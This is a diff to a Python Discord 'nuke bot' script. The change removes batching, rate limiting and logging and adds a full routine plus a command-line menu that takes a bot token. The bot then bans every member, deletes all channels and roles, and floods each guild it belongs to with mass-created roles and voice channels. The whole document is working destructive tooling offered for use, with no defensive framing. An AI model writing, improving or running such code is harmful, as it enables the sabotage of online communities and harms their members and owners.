@@ -4,96 +4,99 @@ from colorama import init, Fore as cc
 from os import name as os_name, system
 from sys import exit
 import asyncio
-import logging
 
-# Initialize colorama and logging
+# Initialize colors
 init()
-logging.basicConfig(level=logging.INFO)
-
-# Color shortcuts
-dr = r = cc.LIGHTRED_EX
-g = cc.LIGHTGREEN_EX
-b = cc.LIGHTBLUE_EX
-m = cc.LIGHTMAGENTA_EX
-c = cc.LIGHTCYAN_EX
-y = cc.LIGHTYELLOW_EX
-w = cc.RESET
+r = cc.LIGHTRED_EX; m = cc.LIGHTMAGENTA_EX; g = cc.LIGHTGREEN_EX; b = cc.LIGHTBLUE_EX; y = cc.LIGHTYELLOW_EX; C = cc.LIGHTCYAN_EX; W = cc.RESET
 
 # Clear screen function
 clear = lambda: system('cls') if os_name == 'nt' else system('clear')
 
-# Input function with color
 def _input(text):
     print(text, end='')
     return input()
 
-# Banner
-baner = f'''
-{r} _   _       _       {m} ____        _   
+baner = f'''{r} _   _       _       {m} ____        _   
 {r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
 {r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
 {r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
-{y}Made by: {g}FASIL_503'''
+{y}Made by: {g}https://github.com/Sigma-cc
+''' 
 
-# Batch processing with strict rate limiting
-async def bulk_operation(tasks, delay=5):
+async def delete_all_channels(guild):
+    tasks = [c.delete() for c in guild.channels]
     results = await asyncio.gather(*tasks, return_exceptions=True)
-    success = 0
-    for result in results:
-        if isinstance(result, Exception):
-            logging.error(f'Operation failed: {result}')
-        else:
-            success += 1
-    await asyncio.sleep(delay)
-    return success
-
-# Modified operations with 30 per 5 seconds rate limit
-async def delete_all_channel(guild):
-    channels = list(guild.channels)
-    deleted = 0
-    for i in range(0, len(channels), 30):  # Changed to 30
-        batch = channels[i:i+30]
-        deleted += await bulk_operation([c.delete() for c in batch], 5)
-    return deleted
+    return sum(1 for r in results if not isinstance(r, Exception))
 
 async def delete_all_roles(guild):
-    roles = [r for r in guild.roles if r.name != "@everyone"]
-    deleted = 0
-    for i in range(0, len(roles), 30):  # Changed to 30
-        batch = roles[i:i+30]
-        deleted += await bulk_operation([r.delete() for r in batch], 5)
-    return deleted
+    tasks = [r.delete() for r in guild.roles if r.name != "@everyone"]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if not isinstance(r, Exception))
 
 async def ban_all_members(guild):
-    if not guild.me.guild_permissions.ban_members:
-        logging.warning("Missing ban permissions")
-        return 0
-    
-    members = [m for m in guild.members if m != guild.me]
-    banned = 0
-    for i in range(0, len(members), 30):  # Changed to 30
-        batch = members[i:i+30]
-        banned += await bulk_operation([m.ban() for m in batch], 5)
-    return banned
+    tasks = [guild.ban(member, reason=None) for member in guild.members if member != guild.me]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if not isinstance(r, Exception))
 
-async def create_roles(guild, name):
-    existing = len(guild.roles)
-    to_create = 200 - existing
-    created = 0
-    while created < to_create:
-        batch = min(30, to_create - created)  # Changed to 30
-        created += await bulk_operation([guild.create_role(name=name) for _ in range(batch)], 5)
-    return created
+async def create_roles(guild, name, limit=100):
+    tasks = [guild.create_role(name=name) for _ in range(min(limit, 200 - len(guild.roles)))]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if not isinstance(r, Exception))
 
-async def create_voice_channels(guild, name):
-    existing = len(guild.channels)
-    to_create = 200 - existing
-    created = 0
-    while created < to_create:
-        batch = min(30, to_create - created)  # Changed to 30
-        created += await bulk_operation([guild.create_voice_channel(name=name) for _ in range(batch)], 5)
-    return created
+async def create_voice_channels(guild, name, limit=100):
+    tasks = [guild.create_voice_channel(name=name) for _ in range(min(limit, 200 - len(guild.channels)))]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if not isinstance(r, Exception))
 
-# Rest of the code remains the same (nuke_guild function and main loop)
-# ... [Keep the rest of the code identical from previous version] ...
+async def nuke_guild(guild, name):
+    print(f"{r}>> Nuking: {m}{guild.name}{W}")
+    # Run destructive tasks concurrently
+    ban_task = ban_all_members(guild)
+    del_chan_task = delete_all_channels(guild)
+    del_role_task = delete_all_roles(guild)
+
+    banned, channels_deleted, roles_deleted = await asyncio.gather(
+        ban_task, del_chan_task, del_role_task
+    )
+    print(f"{m}Banned: {b}{banned}{W}")
+    print(f"{m}Channels deleted: {b}{channels_deleted}{W}")
+    print(f"{m}Roles deleted: {b}{roles_deleted}{W}")
+
+    # Create new resources concurrently
+    create_voice = create_voice_channels(guild, name)
+    create_role = create_roles(guild, name)
+    voice_created, roles_created = await asyncio.gather(create_voice, create_role)
+    print(f"{m}Voice channels created: {b}{voice_created}{W}")
+    print(f"{m}Roles created: {b}{roles_created}{W}")
+    print(f"{r}{'-'*40}{W}\n")
+
+# Main CLI
+while True:
+    clear()
+    choice = _input(f"{baner}\n{C}1){g} Run Nuke Bot  {C}2){g} Exit\n{y}Choice: {g}")
+    if choice == '1':
+        token = _input(f"{y}Bot token: {g}")
+        name = _input(f"{y}Name for new channels/roles: {g}")
+
+        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
+
+        @client.event
+        async def on_ready():
+            print(f"\n[+] Logged in as {client.user} in {len(client.guilds)} guilds")
+            tasks = []
+            for guild in client.guilds:
+                tasks.append(nuke_guild(guild, name))
+            # Execute nukes sequentially to respect rate limits
+            for t in tasks:
+                await t
+            await client.close()
+
+        try:
+            client.run(token)
+        except Exception as e:
+            print(f"{r}Error: {e}{W}")
+            input("Press Enter to return...")
+    elif choice == '2':
+        print(f"{r}Goodbye!{W}")
+        exit()
